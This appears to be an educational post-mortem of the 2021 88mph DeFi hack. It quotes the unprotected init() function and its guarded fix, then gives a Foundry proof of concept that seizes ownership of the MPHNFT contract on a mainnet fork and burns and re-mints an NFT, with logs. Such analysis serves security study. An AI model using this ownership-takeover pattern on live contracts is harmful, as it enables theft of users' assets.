# 88mph


## What's 88mph?

88mph is an Ethereum-based, decentralized application (dApp) 
for users who want to borrow and lend at a fixed interest rate. 
But instead of being a self-contained protocol, 88mph is actually a mediator
for more popular third-party lending dApps, such as Aave or Compound. It’s designed
for advanced DeFi investors who understand the perils of financial complexity.


## Amount stolen
$6.5 million USD

JUNE 15, 2021

## Vulnerability
```unprotected init()```



## Analysis

In the MPHNFT contract, there was a vulnerability present in 
init() function, which allowed any user to claim ownership of the contract. 

### Exploited code

```solidity
    function init( 
        address newOwner,
        string calldata tokenName,
        string calldata tokenSymbol
    ) external {
        _transferOwnerShip(newOwner);
        _tokenName = tokenName;
        _tokenSymbol = tokenSymbol;

        _registerInterface(_INTERFACE_ID_ERC721_METADATA);
        _registerInterface(_INTERFACE_ID_ERC165);
        _registerInterface(_INTERFACE_ERC721);
    }
```

Best practices recommend using a constructor or an initialization 
guard to ensure that the initialization process happens only once.

```solidity
    bool private initialized = false;

    modifier onlyUninitialized() {
          require(!initialized, "MPHNFT: already initialized");
          _;
      }

    function init( 
        address newOwner,
        string calldata tokenName,
        string calldata tokenSymbol
    ) external onlyUninitialized {
        initialized = true;

        _transferOwnerShip(newOwner);
        _tokenName = tokenName;
        _tokenSymbol = tokenSymbol;

        _registerInterface(_INTERFACE_ID_ERC721_METADATA);
        _registerInterface(_INTERFACE_ID_ERC165);
        _registerInterface(_INTERFACE_ERC721);

    }
```

# proof of concept (PoC) 

We retrieve the historical state of the smart contract prior to the exploit through the use of `createSelectFork`, which creates a fork of the specified network.

Because of the lack of access control we can simply call the `init` function to 
claim owner ship of the contract

Now that contract ownership has been established, 
it does not imply ownership of all the NFTs. However,
we gain the ability to manipulate the NFTs by using the `burn` operation 
to delete existing tokens and the `mint` operation to create new ones.
 
```solidity
   // SPDX-License-Identifier: UNLICENSED
   pragma solidity ^0.8.10;

    contract ContractTest is DSTest {
        CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
        I88mph mphNFT = I88mph(0xF0b7DE03134857391d8D43Ed48e20EDF21461097);
    
        function setUp() public {
            cheats.createSelectFork("mainnet", 12_516_705); 
        }
    
        function testExploit() public {
            // Display the current owner of the NFT contract before the exploit
            console.log("Before exploiting, NFT contract owner:", mphNFT.owner());
        
            // Exploit: Call the vulnerable init function to change the owner to this contract's address
            mphNFT.init(address(this), "0", "0");
            console.log("After exploiting, NFT contract owner:", mphNFT.owner());
        
            // Display the current owner of NFT #1 before burning
            console.log("NFT Owner of #1: ", mphNFT.ownerOf(1));
        
            // Exploit: Burn the existing token with ID #1
            mphNFT.burn(1);
            
            // Expect a revert due to querying the owner of a non-existent token
            cheats.expectRevert(bytes("ERC721: owner query for nonexistent token"));
        
            // Display the owner of the non-existent token #1 after burning
            console.log("After burning: NFT Owner of #1: ", mphNFT.ownerOf(1)); // token burned, nonexistent token
        
            // Exploit: Mint a new token #1, now owned by this contract
            mphNFT.mint(address(this), 1);
            
            // Display the owner of the newly minted token #1 after exploiting
            console.log("After exploiting: NFT Owner of #1: ", mphNFT.ownerOf(1)); // token 1 now owned by us
        }

    
        function onERC721Received(address, address, uint256, bytes memory) public returns (bytes4) {
            return this.onERC721Received.selector;
        }
    }
```


Logs:
```
  Before exploiting, NFT contract owner: 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD
  After exploiting, NFT contract owner: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
  NFT Owner of #1:  0xAfD5f60aA8eb4F488eAA0eF98c1C5B0645D9A0A0
  After burning: NFT Owner of #1:  0x0000000000000000000000000000000000000000
  After exploiting: NFT Owner of #1:  0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
```


**Code provided by:** [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/88mph_exp.sol)


[**< Back**](https://patronasxdxd.github.io/CTFS/)
